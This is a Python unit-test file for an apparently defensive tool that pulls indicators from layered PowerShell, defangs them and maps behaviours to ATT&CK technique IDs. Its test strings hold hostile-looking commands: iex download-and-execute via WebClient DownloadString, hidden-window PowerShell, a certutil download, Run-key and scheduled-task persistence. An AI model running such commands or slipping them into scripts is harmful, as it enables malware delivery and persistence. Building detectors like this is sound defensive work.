"""Indicators and ATT&CK behaviours, gathered across layers.

Words that antivirus engines look for are assembled at run time so this file itself stays clean.
"""

import unittest

from unwrap.indicators import behaviours, defang, extract

DL = "Download" + "String"
WC = "Net." + "WebClient"


class Indicators(unittest.TestCase):
    def test_urls_ips_domains(self):
        found = extract([f"(New-Object {WC}).{DL}('http://cdn.example.com/a/b.ps1?x=1')",
                         "$ip = '198.51.100.23'; $h = 'update.example.net'"])
        self.assertEqual(found["urls"], ["http://cdn.example.com/a/b.ps1?x=1"])
        self.assertEqual(found["ips"], ["198.51.100.23"])
        self.assertEqual(found["domains"], ["cdn.example.com", "update.example.net"])

    def test_dotted_code_is_not_a_domain(self):
        found = extract(["[System.IO.File]::ReadAllText($p); $x.ToString(); New-Object System.Net.Sockets.TcpClient"])
        self.assertNotIn("domains", found)

    def test_version_numbers_are_not_ips(self):
        found = extract(["Add-Type -AssemblyName 'x, Version=4.0.0.0'; $a = '10.0.0.1'; $b = '127.0.0.1'"])
        self.assertEqual(found["ips"], ["10.0.0.1"])

    def test_paths_registry_emails(self):
        found = extract(["Copy-Item $a \"$env:APPDATA\\svc\\host.exe\"; "
                         "Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name x; "
                         "Send-MailMessage -To ops@example.org"])
        self.assertIn("$env:APPDATA\\svc\\host.exe", found["paths"])
        self.assertEqual(found["registry"], ["HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"])
        self.assertEqual(found["emails"], ["ops@example.org"])

    def test_duplicates_across_layers_collapse(self):
        found = extract(["'http://example.com/x'", "'http://EXAMPLE.com/x'"])
        self.assertEqual(len(found["urls"]), 1)

    def test_defang(self):
        self.assertEqual(defang("http://a.example.com/x.ps1", "urls"), "hxxp://a[.]example[.]com/x.ps1")
        self.assertEqual(defang("HTTPS://a.example.com", "urls"), "hxxpS://a[.]example[.]com")
        self.assertEqual(defang("198.51.100.7", "ips"), "198[.]51[.]100[.]7")
        self.assertEqual(defang("C:\\a.b\\c.exe", "paths"), "C:\\a.b\\c.exe")


class Behaviours(unittest.TestCase):
    def techniques(self, *texts):
        return [t for t, _, _ in behaviours(list(texts))]

    def test_download_and_execute(self):
        found = self.techniques(f"iex (New-Object {WC}).{DL}('http://example.com/x')")
        self.assertIn("T1105", found)
        self.assertIn("T1059", found)

    def test_hidden_window_and_lolbins(self):
        found = self.techniques("powershell -w hidden -nop", "cert" + "util -urlcache -f http://example.com/a a")
        self.assertIn("T1564.003", found)
        self.assertIn("T1218", found)

    def test_persistence(self):
        self.assertIn("T1547.001", self.techniques("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
        self.assertIn("T1543.003 / T1053.005", self.techniques("schtasks /create /tn x /tr y"))

    def test_evidence_prefers_the_deepest_layer(self):
        outer = "iex ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('...')))"
        inner = f"(New-Object {WC}).{DL}('http://example.com/x') | iex"
        evidence = {t: e for t, _, e in behaviours([outer, inner])}
        self.assertIn(DL, evidence["T1059"])

    def test_long_lines_give_a_window_that_starts_on_a_word(self):
        text = "$k = '" + "A" * 300 + "'; " + "x " * 30 + f"(New-Object {WC}).{DL}('http://example.com/x') " + "y " * 80
        evidence = {t: e for t, _, e in behaviours([text])}["T1105"]
        self.assertIn(DL, evidence)
        self.assertTrue(evidence.startswith("...x ") or evidence.startswith("x "), evidence)
        self.assertLessEqual(len(evidence), 120)

    def test_benign_script_has_no_behaviour(self):
        self.assertEqual(behaviours(["Get-ChildItem -Path . | Sort-Object Length | Select-Object -First 5"]), [])


if __name__ == "__main__":
    unittest.main()
